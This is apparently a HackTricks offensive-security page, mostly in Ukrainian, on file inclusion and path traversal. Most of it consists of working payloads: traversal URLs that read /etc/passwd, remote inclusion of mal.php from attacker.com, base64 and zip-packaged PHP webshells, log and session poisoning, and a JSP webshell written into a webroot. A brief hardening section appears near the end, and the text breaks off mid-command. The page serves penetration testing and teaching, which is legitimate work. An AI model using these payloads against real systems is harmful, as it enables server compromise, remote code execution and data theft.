# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Файл завантажується з віддаленого сервера (Перевага: ви можете написати код, і сервер його виконає). У PHP це за замовчуванням **вимкнено** (**allow_url_include**).\
**Local File Inclusion (LFI):** Сервер завантажує локальний файл.

Вразливість виникає, коли користувач якимось чином може контролювати файл, який буде завантажений сервером.

Уразливі **PHP functions**: require, require_once, include, include_once

Корисний інструмент для експлуатації цієї вразливості: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Змішавши кілька \*nix LFI списків і додавши більше шляхів, я створив цей:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Спробуйте також замінити `/` на `\`\
Спробуйте також додати `../../../../../`

Список, який використовує кілька технік для знаходження файлу /etc/password (щоб перевірити, чи існує вразливість), можна знайти [тут](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Злиття різних wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Спробуйте також замінити `/` на `\`\
Спробуйте також видалити `C:/` і додати `../../../../../`

Список, який використовує кілька технік для знаходження файлу /boot.ini (щоб перевірити, чи існує вразливість), можна знайти [тут](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Перевірте LFI список для Linux.

## Основи LFI та обхідні методи

Усі приклади стосуються Local File Inclusion, але також можуть бути застосовані до Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences видаляються нерекурсивно
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass додавання додаткових символів у кінець наданого рядка (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Це **виправлено з PHP 5.4**

### **Кодування**

Ви можете використовувати нестандартні кодування, такі як double URL encode (та інші):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Із існуючої папки

Можливо, back-end перевіряє шлях до папки:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Дослідження директорій файлової системи на сервері

Файлову систему сервера можна рекурсивно досліджувати для виявлення директорій, а не лише файлів, використовуючи певні техніки. Цей процес включає визначення глибини директорії та перевірку наявності конкретних папок. Нижче наведено детальний метод для досягнення цього:

1. **Визначте глибину директорії:** Визначте глибину поточної директорії шляхом успішного отримання файлу `/etc/passwd` (застосовно, якщо сервер працює під Linux). Приклад URL може мати таку структуру, що вказує на глибину три:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Перевірка папок:** Додайте назву підозрілої папки (наприклад, `private`) до URL, потім поверніться до `/etc/passwd`. Додатковий рівень директорії вимагає збільшення глибини на одиницю:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Інтерпретація результатів:** Відповідь сервера вказує, чи існує папка:
- **Помилка / Немає виводу:** Папка `private` ймовірно не існує за вказаним шляхом.
- **Вміст `/etc/passwd`:** Підтверджено наявність папки `private`.
4. **Рекурсивне дослідження:** Виявлені папки можна додатково досліджувати на наявність підкаталогів або файлів, використовуючи ту саму техніку або традиційні Local File Inclusion (LFI) методи.

Щоб дослідити директорії в інших частинах файлової системи, відповідно змініть payload. Наприклад, щоб перевірити, чи містить `/var/www/` папку `private` (припускаючи, що поточна директорія знаходиться на глибині 3), використовуйте:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation — це метод, який використовують для маніпулювання шляхами файлів у веб-застосунках. Часто його використовують для доступу до обмежених файлів, оминаючи певні заходи безпеки, які додають додаткові символи в кінець шляхів файлів. Мета — сформувати шлях, який після внесених заходом безпеки змін все одно вказуватиме на потрібний файл.

У PHP різні представлення шляху файлу можуть вважатися еквівалентними через особливості файлової системи. Наприклад:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, та `/etc/passwd/` обробляються як один і той же шлях.
- Коли останні 6 символів — `passwd`, додавання `/` (тобто `passwd/`) не змінює цільового файлу.
- Аналогічно, якщо до шляху додається `.php` (наприклад, `shellcode.php`), додавання `/.` вкінці не змінить файл, до якого відбувається доступ.

Наведені приклади демонструють, як використовувати path truncation для доступу до `/etc/passwd` — часта ціль через конфіденційний вміст (інформація про облікові записи користувачів):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
У цих сценаріях кількість traversals, які потрібні, може становити близько 2027, але це число може змінюватися залежно від конфігурації сервера.

- **Using Dot Segments and Additional Characters**: traversal sequences (`../`) у поєднанні з додатковими dot segments та символами можна використовувати для навігації файловою системою, ефективно ігноруючи сервером додані рядки.
- **Determining the Required Number of Traversals**: Через метод спроб і помилок можна знайти точну кількість traversal sequences (`../`) необхідних для переходу до кореневого каталогу, а потім до `/etc/passwd`, гарантуючи, що будь-які додані рядки (наприклад, `.php`) нейтралізовані, але бажаний шлях (`/etc/passwd`) залишається незмінним.
- **Starting with a Fake Directory**: Загальною практикою є починати шлях з неіснуючого каталогу (наприклад, `a/`). Ця техніка використовується як запобіжний захід або для виконання вимог логіки парсингу шляху сервера.

When employing path truncation techniques, важливо розуміти поведінку парсингу шляху сервером і структуру файлової системи. Кожен сценарій може вимагати іншого підходу, і часто необхідне тестування, щоб знайти найефективніший метод.

**Ця уразливість була виправлена в PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

У php це вимкнено за замовчуванням, бо **`allow_url_include`** встановлено в **Off.** Воно має бути **On**, щоб це працювало, і в такому випадку ви можете include PHP файл зі свого сервера і отримати RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Якщо з якоїсь причини **`allow_url_include`** є **On**, але PHP **filtering** доступ до зовнішніх веб-сторінок, [згідно з цим постом](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), ви можете, наприклад, використати протокол data з base64, щоб декодувати b64 PHP-код і отримати RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> У попередньому коді фінальний `+.txt` було додано, бо зловмиснику потрібен був string, який закінчувався на `.txt`, тож string завершується ним, і після b64 decode ця частина поверне лише junk, а справжній PHP code буде включено (і, отже, виконано).

Ще один приклад **без використання протоколу `php://`** буде:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python кореневий елемент

У Python у коді, як у цьому:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Якщо користувач передає **абсолютний шлях** до **`file_name`**, **попередній шлях просто видаляється**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Це очікувана поведінка згідно з [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Якщо компонент є абсолютним шляхом, всі попередні компоненти відкидаються і об'єднання продовжується з компонента абсолютного шляху.

## Java Перелік директорій

Здається, якщо у вас є Path Traversal у Java і ви **запитуєте директорію** замість файлу, то **повертається список вмісту директорії**. Це не відбуватиметься в інших мовах (наскільки мені відомо).

## Топ-25 параметрів

Ось список топ-25 параметрів, які можуть бути вразливі до local file inclusion (LFI) vulnerabilities (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI за допомогою PHP обгорток та протоколів

### php://filter

PHP filters дозволяють виконувати базові **операції модифікації над даними** перед тим, як вони будуть прочитані або записані. Існує 5 категорій фільтрів:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Видаляє теги з даних (усе між символами "<" і ">")
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transforms to a different encoding(`convert.iconv.<input_enc>.<output_enc>`) . To get the **list of all the encodings** supported run in the console: `iconv -l`

> [!WARNING]
> Зловживаючи фільтром конвертації `convert.iconv.*`, ви можете **згенерувати довільний текст**, що може бути корисно для запису довільного тексту або змусити функцію, наприклад include, обробляти довільний текст. Для детальнішої інформації див. [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Стискає вміст (корисно if exfiltrating a lot of info)
- `zlib.inflate`: Decompress the data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Other Filters
- Running in php `var_dump(stream_get_filters());` you can find a couple of **unexpected filters**:
- `consumed`
- `dechunk`: reverses HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Частина "php://filter" нечутлива до регістру

### Використання php filters як oracle для читання довільних файлів

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) запропоновано техніку для читання локального файлу без повернення його вмісту сервером. Ця техніка базується на **булевій ексфільтрації файлу (символ за символом) з використанням php filters** як oracle. Це можливо, бо php filters можна використати, щоб зробити текст настільки великим, що php викине виняток.

У оригінальному дописі можна знайти детальне пояснення техніки, але ось коротке резюме:

- Використовуйте кодек **`UCS-4LE`**, щоб розмістити ведучий символ тексту на початку і змусити розмір рядка зростати експоненційно.
- Це використовується для створення **тексту настільки великого, коли початкова літера вгадана правильно**, що php спровокує **помилку**.
- Фільтр **dechunk** **видалить все, якщо перший символ не є шістнадцятковим**, тож ми можемо дізнатися, чи перший символ є hex.
- Це, у поєднанні з попереднім (та іншими фільтрами залежно від вгаданої літери), дозволить вгадувати літеру на початку тексту, спостерігаючи, коли після достатньої кількості перетворень вона перестане бути шістнадцятковим символом. Адже якщо вона є hex, dechunk її не видалить і початкова «бомба» спричинить помилку php.
- Кодек **convert.iconv.UNICODE.CP930** перетворює кожну літеру на наступну (наприклад a -> b). Це дозволяє визначити, чи перша літера — `a`: якщо застосувати цей кодек 6 разів (a->b->c->d->e->f->g), літера перестане бути шістнадцятковим символом, тому dechunk її не видалить і помилка php буде викликана через множення з початковою «бомбою».
- Використовуючи інші перетворення, такі як **rot13**, на початку, можливо leak інших символів, наприклад n, o, p, q, r (інші кодеки можуть бути використані, щоб перемістити інші літери в hex-діапазон).
- Коли початковий символ — число, потрібно закодувати його в base64 і leak перші 2 літери, щоб leak число.
- Остаточна проблема — зрозуміти **як leak більше, ніж початкова літера**. Використовуючи фільтри, що змінюють порядок байтів, такі як **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE**, можна змінити порядок символів і отримати в першій позиції інші літери тексту.
- І щоб мати змогу отримувати **further data** ідея полягає в **generate 2 bytes of junk data at the beginning** за допомогою **convert.iconv.UTF16.UTF16**, застосувати **UCS-4LE**, щоб **pivot with the next 2 bytes**, і **видалити дані до junk data** (це видалить перші 2 байти початкового тексту). Продовжуйте робити це, поки не досягнете потрібного біта для leak.

У дописі також було опубліковано інструмент для автоматизації: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Ви також можете використовувати **php://stdin, php://stdout and php://stderr** для доступу до **file descriptors 0, 1 and 2** відповідно (не впевнений, як це може бути корисним у атаці)

### zip:// and rar://

Завантажте Zip або Rar файл з PHPShell всередині та отримайте до нього доступ.\
Щоб мати можливість зловживати протоколом rar, його **потрібно спеціально активувати**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Зауважте, що цей протокол обмежується конфігураціями php **`allow_url_open`** та **`allow_url_include`**

### expect://

Expect має бути активований. Ви можете виконати код за допомогою цього:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Вкажіть свій payload у POST-параметрах:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Файл `.phar` може використовуватися для виконання PHP-коду, коли веб-додаток застосовує функції, такі як `include`, для завантаження файлів. Наведений нижче фрагмент PHP-коду демонструє створення файлу `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Щоб скомпілювати файл `.phar`, слід виконати наступну команду:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

У випадку, якщо LFI лише читає файл без виконання PHP-коду всередині, через функції такі як `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, або `filesize()`, можна спробувати експлуатувати вразливість десеріалізації. Ця вразливість пов’язана з читанням файлів за допомогою протоколу `phar`.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Дуже короткий підсумок: **3 byte overflow** в купі PHP було використано для **зміни ланцюжка вільних чанків** конкретного розміру, щоб мати змогу **записати будь-що в будь-яку адресу**, тому був доданий хук, який викликає **`system`**.\
Було можливо алокувати чанки конкретних розмірів, зловживаючи додатковими php filters.

### More protocols

Перевірте більше можливих [ **протоколів для включення тут**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Запис у пам’ять або у тимчасовий файл (не впевнений, як це може бути корисним у file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Доступ до локальної файлової системи
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Доступ до HTTP(s) URL
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Доступ до FTP(s) URL
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Потоки стиснення
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Пошук імен шляхів, що відповідають шаблону (не повертає нічого придатного для виводу, тож не надто корисний тут)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Аудіопотоки (не корисний для читання довільних файлів)

## LFI via PHP's 'assert'

Ризики LFI в PHP особливо високі при роботі з функцією 'assert', яка може виконувати код в межах рядків. Це особливо проблематично, якщо ввод, що містить символи для directory traversal, такі як "..", перевіряється, але не очищується належним чином.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Хоча це спрямовано на зупинення traversal, воно ненавмисно створює вектор для code injection. Щоб експлуатувати це для читання вмісту файлу, нападник може використати:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Аналогічно, для виконання довільних системних команд можна використати:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ця техніка актуальна в випадках, коли ви **контролюєте** **file path** для **PHP function**, яка **access a file**, але ви не бачитимете вміст файлу (наприклад простий виклик **`file()`**) — і вміст не показується.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

У підсумку, техніка використовує кодування **"UCS-4LE"** щоб зробити вміст файлу таким **великим**, що **PHP function**, яка відкриває файл, викличе **error**.

Далі, щоб leak перший символ, фільтр **`dechunk`** використовується разом з іншими (наприклад **base64** або **rot13**), а в кінці фільтри **convert.iconv.UCS-4.UCS-4LE** та **convert.iconv.UTF16.UTF-16BE** застосовуються, щоб **place other chars at the beggining and leak them**.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Коли серверний код, який приймає/завантажує файли, будує destination path з використанням даних, контрольованих користувачем (наприклад filename або URL), без нормалізації та валідації, сегменти `..` та absolute paths можуть вийти за межі призначеної директорії й спричинити arbitrary file write. Якщо ви можете помістити payload у веб-доступну директорію, зазвичай ви отримуєте unauthenticated RCE, скинувши webshell.

Типовий робочий процес експлуатації:
- Знайти write primitive в endpoint або background worker, який приймає path/filename і записує контент на диск (наприклад message-driven ingestion, XML/JSON command handlers, ZIP extractors тощо).
- Визначити веб-доступні директорії. Поширені приклади:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Зконструювати traversal path, який виходить із призначеної директорії зберігання в webroot, і включити в нього ваш webshell content.
- Перейти до скинутого payload і виконати команди.

Notes:
- Уразливий сервіс, який виконує запис, може слухати на non-HTTP порту (наприклад JMF XML listener on TCP 4004). Головний веб-портал (інший порт) пізніше віддаватиме ваш payload.
- На Java-стеках ці записи файлів часто реалізовані простим конкатенуванням `File`/`Paths`. Відсутність нормалізації/allow-listing — основний недолік.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Заходи жорсткого захисту, що усувають цей клас вразливостей:
- Нормалізуйте шлях до канонічної форми і переконайтеся, що він є нащадком дозволеної базової директорії.
- Відкидайте будь-який шлях, що містить `..`, абсолютні корені або літери дисків; віддавайте перевагу згенерованим іменам файлів.
- Запускайте процес запису від імені облікового запису з низькими правами та розділяйте директорії для запису від коренів, які обслуговуються.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

Якщо сервер Apache або Nginx є **вразливим до LFI** у функції include, можна спробувати отримати доступ до **`/var/log/apache2/access.log` або `/var/log/nginx/access.log`**, помістити у **user agent** або в **GET параметр** php-shell на кшталт **`<?php system($_GET['c']); ?>`** і підключити цей файл

> [!WARNING]
> Зауважте, що **якщо ви використовуєте подвійні лапки** для шеллу замість **одинарних лапок**, подвійні лапки будуть змінені для рядка "_**quote;**_", **PHP кине помилку** і **нічого іншого не буде виконано**.
>
> Також переконайтеся, що ви **правильно записали payload**, інакше PHP буде видавати помилку щоразу при спробі завантажити лог-файл і у вас не буде другої можливості.

Це також можна зробити в інших логах, але **обережно,** код у логах може бути URL-кодований і це може зруйнувати Shell. Заголовок **authorisation "basic"** містить "user:password" у Base64 і декодується у логах. PHPShell можна вставити всередину цього заголовку.\
Інші можливі шляхи логів:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Через електронну пошту

**Відправте лист** на внутрішній акаунт (user@localhost), що містить ваш PHP payload, наприклад `<?php echo system($_REQUEST["cmd"]); ?>`, і спробуйте зробити include пошти користувача за шляхом, наприклад **`/var/mail/<USERNAME>`** або **`/var/spool/mail/<USERNAME>`**

### Через /proc/\*/fd/\*

1. Завантажте велику кількість shells (наприклад: 100)
2. Зробіть include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), де $PID = PID процесу (можна brute force), а $FD — file descriptor (також можна brute force)

### Через /proc/self/environ

Як із лог-файлом, відправте payload у User-Agent — він відобразиться в файлі /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Якщо ви можете upload файл, просто inject shell payload у нього (наприклад: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Щоб файл залишався читабельним, найкраще інжектувати у метадані pictures/doc/pdf

### Через завантаження ZIP файлу

Завантажте ZIP файл, що містить стиснутий PHP shell, і отримайте доступ:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Через PHP sessions

Перевірте, чи сайт використовує PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
У PHP ці сесії зберігаються в _/var/lib/php5/sess\\_\[PHPSESSID]\_ файлах
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Встановіть cookie на `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Використайте LFI, щоб включити файл сесії PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Через ssh

Якщо ssh активний, перевірте, який користувач використовується (/proc/self/status & /etc/passwd) і спробуйте отримати доступ до **\<HOME>/.ssh/id_rsa**

### **Через** **vsftpd** _**логи**_

Логи FTP-сервера vsftpd знаходяться за адресою _**/var/log/vsftpd.log**_. У випадку, якщо існує Local File Inclusion (LFI) уразливість і є доступ до відкритого vsftpd сервера, можна розглянути такі кроки:

1. Інжектуйте PHP payload у поле username під час процесу входу.
2. Після інжекції скористайтеся LFI, щоб отримати логи сервера з _**/var/log/vsftpd.log**_.

### Через php base64 filter (using base64)

Як показано в [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) статті, PHP base64 filter ігнорує символи, що не є base64. Ви можете використати це, щоб обійти перевірку розширення файлу: якщо ви подасте base64, що закінчується на ".php", фільтр просто ігноруватиме "." і додасть "php" до base64. Ось приклад payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Через php filters (файл не потрібен)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) пояснює, що ви можете використовувати **php filters** для генерації довільного вмісту як вивід. Це, по суті, означає, що ви можете **згенерувати довільний PHP-код** для include **без необхідності записувати** його у файл.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Через segmentation fault

Завантажте файл, який буде збережено тимчасово в `/tmp`, потім у **тому ж запиті** викличте **segmentation fault**, після чого тимчасовий файл не буде видалено і ви зможете його знайти.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Через тимчасове збереження файлів Nginx

Якщо ви виявили **Local File Inclusion** і **Nginx** працює перед PHP, ви можете отримати RCE за допомогою наступної техніки:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Через PHP_SESSION_UPLOAD_PROGRESS

Якщо ви знайшли **Local File Inclusion**, навіть якщо у вас **немає сесії** і `session.auto_start` встановлено в `Off`. Якщо ви вкажете **`PHP_SESSION_UPLOAD_PROGRESS`** у даних **multipart POST**, PHP **увімкне сесію за вас**. Це можна використати для отримання RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Через тимчасові завантаження файлів у Windows

Якщо ви знайшли **Local File Inclusion** і сервер працює на **Windows**, можливо ви отримаєте RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Через `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), скрипт `/usr/local/lib/phppearcmd.php` присутній за замовчуванням у php docker images. Більш того, аргументи можна передавати скрипту через URL, оскільки вказано, що якщо параметр URL не має `=`, він має використовуватися як аргумент. Див. також [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) та [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Наведене експлуатує CRLF vuln для отримання RCE (з [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
